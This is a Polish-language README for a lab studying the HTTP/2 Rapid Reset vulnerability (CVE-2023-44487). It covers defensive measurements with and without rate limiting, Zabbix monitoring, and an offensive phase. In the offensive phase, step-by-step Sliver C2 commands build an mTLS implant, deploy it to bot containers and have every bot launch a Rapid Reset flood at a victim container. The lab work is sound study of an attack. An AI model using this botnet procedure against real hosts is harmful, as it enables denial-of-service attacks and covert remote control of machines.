# lab-results — eksperymenty, dane i raport

Dowód wykonanej pracy nad labem HTTP/2 Rapid Reset (CVE-2023-44487): skrypty
pomiarowe, surowe dane, wykres-raport oraz procedura ofensywna sterowana przez
C2 (Sliver). Wszystko jest odtwarzalne na mocniejszej maszynie — patrz niżej.

## Struktura

```
lab-results/
  scripts/      przenośne skrypty do odpalenia na dowolnej maszynie
    run-botnet-matrix.sh      matryca: rozmiar botnetu × 4 konfiguracje serwera
  data/         surowe wyniki (CSV) + osie czasu scenariuszy
    results.csv            pomiar 1-sek, eksperyment defensywny (h2load, 5 progów)
    stats.csv             rozkład statusów (2xx/429) per scenariusz
    botnet.csv            matryca botnet: CPU ofiary wg rozmiaru botnetu × konfiguracja
    attackers.txt         statystyki od strony atakującego (h2load + bot Rapid Reset)
    timeline.txt          dokładne znaczniki czasu scenariuszy (do zrzutów Zabbix)
  report/
    raport.html           interaktywny raport-dashboard (otwórz w przeglądarce)
  as-run/       surowe skrypty dokładnie tak, jak uruchamiane w sesji (proof-of-work;
                mają ścieżki specyficzne dla maszyny autora — do wglądu, nie do uruchamiania)
```

Zmiana w `monitoring/provision.py` i `monitoring/alerts.py`: timeout API Zabbixa
podbity 15→120 s (ciężki `host.create` z dużym szablonem padał na wolnym hoście).

## Dwa tory eksperymentu

### 1. Defensywny / monitoring (zrobiony, z raportem)
Atak floodowy HTTP/2 (`h2load`) na ofiarę przy 5 progach obciążenia (~10/20/40/55/80% CPU),
**z obroną i bez** (rate-limiting per-IP). Pomiar bezpośredni co 1 s + monitoring Zabbix.
Wyniki i wnioski: `report/raport.html` (+ `data/results.csv`, `data/stats.csv`).

Najważniejsze: tryb utwardzony trzyma CPU ofiary na ~2% przy każdym natężeniu
(flood odbijany kodem 429 na brzegu), a autentyczny Rapid Reset (bot) wysłał
~562 tys. `RST_STREAM` przy 0 udanych odpowiedziach — łatka nginx w akcji.

### 2. Ofensywny / botnet sterowany przez C2 (ten katalog)
Flota botów (osobne kontenery = osobne IP) odpala **autentyczny Rapid Reset**
przeciw ofierze; obciążenie skalowane **rozmiarem botnetu** (1→5) dla 4 konfiguracji:
nienałatany/załatany nginx × z hardeningiem/bez. Dane: `data/botnet.csv`.

## Jak odtworzyć matrycę botnet (mocna maszyna)

```bash
# 1. Podnieś bazowy lab (sieć labnet + loadgen + obraz bota + c2/Sliver)
docker compose up -d --build

# 2. Odpal matrycę. Na mocnym CPU podnieś limity, żeby flota realnie dociążyła ofiarę:
BOT_CPUS=1.0 VIC_CPUS=2.0 CONC=800 bash lab-results/scripts/run-botnet-matrix.sh
```

Skrypt sam zbuduje obrazy ofiary (`labvic:old` = nginx 1.25.1, `labvic:new` = 1.27),
postawi flotę `lab-bot1..5` (osobne IP), przejdzie 4 konfiguracje × rozmiary 1..5
i zapisze `data/botnet.csv` + wydrukuje tabelę CPU. Parametry (zmienne środowiskowe)
opisane w nagłówku skryptu.

> Uwaga o magnitudzie: Rapid Reset jest **tani w obsłudze dla nginx** (anulowane
> strumienie), więc na słabym hoście (4 rdzenie) flota nie nasyca ofiary i wyniki
> są niskie/zaszumione — to realna odporność nginx. Na maszynie z większą liczbą
> rdzeni (i wyższym `BOT_CPUS`) krzywa CPU vs rozmiar botnetu jest wyższa i czystsza.

## Faza C2 — atak sterowany przez Sliver (procedura)

Flota jest gotowa do sterowania przez C2. Binarka serwera Sliver siedzi w kontenerze
`c2` (`/opt/sliver/sliver-server`, montowana z `c2/bin/`). Demonstracja „state-of-the-art
botnet C2":

### Automatyzacja — jedna komenda

```bash
FLEET=5 DURATION=120 bash lab-results/scripts/run-c2-attack.sh
```
Skrypt robi całość: listener mTLS → generuje implanta (lub bierze z cache
`c2/data/botimplant`) → wgrywa na flotę i uruchamia implanty → czeka na sesje →
komendą `execute` odpala Rapid Reset na wszystkich botach → zapisuje dowód
(lista sesji) do `lab-results/data/c2-proof.txt`.

> Pierwszy `generate` kompiluje implanta (Go) — jedyny wolny krok. Na słabym CPU
> może nie zdążyć (podnieś `BUILD_TIMEOUT`); na mocnym idzie kilka minut, a wynik
> jest cache'owany. Jeśli Twoja wersja Sliver ma inny format tabeli `sessions` i
> skrypt nie sparsuje ID, wypisze gotowe komendy do ręcznego `execute` — procedura niżej.

### Procedura ręczna (fallback / do nauki)

```bash
# konsola Slivera
docker compose exec c2 /opt/sliver/sliver-server
```
W konsoli (mTLS = wzajemne TLS, domyślny kanał):
```
mtls --lport 8888                               # listener dla implantów
generate --mtls lab-c2:8888 --os linux --arch amd64 \
         --skip-symbols --save /root/.sliver/implant     # zbuduj implant (linux)
```
Implant pojawi się w `c2/data/implant` (montowane). Wgraj go na boty i uruchom
(każdy bot ma już `rapidreset`):
```bash
for i in 1 2 3 4 5; do
  docker cp c2/data/implant lab-bot$i:/implant
  docker exec -d lab-bot$i /implant               # implant beaconuje do c2 (mTLS)
done
```
W konsoli Slivera boty zgłoszą się jako sesje:
```
sessions                                          # 5 implantów z różnych IP
interact <ID>
execute /usr/local/bin/rapidreset -url https://victim:443 -requests 20000 -concurrency 1000
```
Komenda `execute` odpala Rapid Reset na bocie **z poziomu C2**. Powtórz na kolejnych
sesjach (albo zeskryptuj), żeby cała flota uderzyła jednocześnie — zrzut listy sesji
+ komendy = dowód sterowania botnetem. Efekt obserwuj w Zabbixie (Monitoring → Latest
data: Nginx Connections active / CPU) albo bezpośrednio (`docker exec lab-victim2 ...`).

> Dokładne flagi mogą się różnić między wersjami Sliver — `help generate`, `help mtls`
> w konsoli. Implanty są linuxowe/amd64 i uruchamiają się w kontenerach bota (alpine).

## Monitoring Zabbix

```bash
docker compose -f docker-compose.yml -f docker-compose.override.yml \
  -f docker-compose.monitoring.yml up -d --build zabbix-db zabbix-server zabbix-web
docker compose -f docker-compose.yml -f docker-compose.override.yml \
  -f docker-compose.monitoring.yml run --rm zabbix-provision   # host victim + szablony
```
Frontend: http://localhost:8080 (Admin / zabbix). Szczegóły: `README-MONITORING.md`.
